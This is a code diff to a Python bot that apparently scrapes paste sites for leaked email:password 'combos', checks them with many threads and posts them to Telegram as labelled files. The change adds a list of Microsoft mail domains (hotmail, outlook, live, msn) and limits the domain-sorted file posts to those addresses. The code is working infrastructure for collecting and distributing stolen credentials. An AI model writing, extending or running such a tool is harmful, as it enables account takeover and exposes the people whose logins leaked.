@@ -33,6 +33,12 @@ OWNER_ID           = int(os.environ["OWNER_ID"])
 
 CHECK_INTERVAL   = 30
 CHECKER_THREADS  = 50
+MS_DOMAINS = {"hotmail.com", "hotmail.co.uk", "hotmail.fr", "hotmail.de", "hotmail.it",
+              "hotmail.es", "hotmail.nl", "hotmail.be", "hotmail.se", "hotmail.no",
+              "hotmail.dk", "hotmail.fi", "hotmail.pt", "hotmail.com.ar", "hotmail.com.br",
+              "outlook.com", "outlook.fr", "outlook.de", "outlook.es", "outlook.co.uk",
+              "live.com", "live.co.uk", "live.fr", "live.de", "live.nl",
+              "msn.com"}
 PAGES_TO_SCAN    = 5
 ARCHIVE_URL      = "https://pasteview.com/paste-archive"
 PASTEDPW_URL     = "https://pasted.pw/recent.php"
@@ -501,26 +507,28 @@ async def monitor_loop():
                                 await send_telegram_file(tg_header + "\n".join(chunk), fname)
                                 await asyncio.sleep(0.5)
 
-                            # Post 1-3 random domain sorted files
-                            try:
-                                domain_map = {}
-                                for combo in all_raw:
-                                    try:
-                                        domain = combo.split(":", 1)[0].split("@")[-1].lower()
-                                        domain_map.setdefault(domain, []).append(combo)
-                                    except Exception:
-                                        pass
-                                if domain_map:
-                                    num_domains = random.randint(1, min(3, len(domain_map)))
-                                    picked = random.sample(list(domain_map.keys()), num_domains)
-                                    for domain in picked:
-                                        combos = domain_map[domain]
-                                        dfname = f"[ PVT ] [ {quality} ] [ {len(combos)} ] [ {domain.upper()} ].txt"
-                                        await send_telegram_file(tg_header + "\n".join(combos), dfname)
-                                        await asyncio.sleep(0.5)
-                                    log.info(f"Posted {num_domains} domain file(s): {picked}")
-                            except Exception as e:
-                                log.error(f"Failed to post domain files: {e}")
+                            # Post 1-3 random domain sorted files (hotmail only)
+                            if label == "hotmail":
+                                try:
+                                    domain_map = {}
+                                    for combo in all_raw:
+                                        try:
+                                            domain = combo.split(":", 1)[0].split("@")[-1].lower()
+                                            if domain in MS_DOMAINS:
+                                                domain_map.setdefault(domain, []).append(combo)
+                                        except Exception:
+                                            pass
+                                    if domain_map:
+                                        num_domains = random.randint(1, min(3, len(domain_map)))
+                                        picked = random.sample(list(domain_map.keys()), num_domains)
+                                        for domain in picked:
+                                            combos = domain_map[domain]
+                                            dfname = f"[ PVT ] [ {quality} ] [ {len(combos)} ] [ {domain.upper()} ].txt"
+                                            await send_telegram_file(tg_header + "\n".join(combos), dfname)
+                                            await asyncio.sleep(0.5)
+                                        log.info(f"Posted {num_domains} domain file(s): {picked}")
+                                except Exception as e:
+                                    log.error(f"Failed to post domain files: {e}")
 
                             if toggles["telegram_public"]:
                                 private_post_count_ref = globals()
